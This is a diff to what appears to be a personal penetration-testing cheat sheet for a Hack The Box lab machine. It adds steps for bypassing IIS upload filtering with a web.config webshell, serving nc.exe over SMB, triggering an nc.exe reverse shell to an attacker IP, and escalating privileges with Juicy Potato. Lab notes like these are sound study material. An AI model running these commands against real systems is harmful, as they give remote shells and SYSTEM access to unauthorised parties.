@@ -178,6 +178,26 @@ Password Protected SSH Private Key:
 	- impacket
 		- Start SMB server: impacket-smbserver smb Downloads/ 
 		- On victim: copy \\10.10.16.12\smb\nc.exe
+		
+	- Bypassing shell uplaod filtering on IIS
+		- Upload web.config to victim: https://raw.githubusercontent.com/tennc/webshell/master/aspx/web.config
+		- On the attacker machine, locate nc.exe and serve via SMB: impacket-smbserver smb Downloads/ 
+			- Listen for a connection: nc -lnvp 1234
+		- http://bounty.htb/uploadedfiles/web.config?cmd=\\10.10.XX.XX\smb\nc.exe -e cmd.exe 10.10.XX.XX 1337
+		
+	- Privelege escalation 
+		- Juicy Potato
+			- SeImpersonatePrivilege needs to be enabled
+			- Download the exe: https://github.com/ohpe/juicy-potato/releases/tag/v0.1
+			- On the attacker machine listen on a port of you choosing: nc -lnvp 1337
+			- on the vicitm machine: 
+				- go to the parent dir
+				
+			- On the victim machine: juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\tmp\nc.exe -e cmd.exe 10.10.XX.XX 1337" -t *
+		
+			
+		
+			
 			
 
 
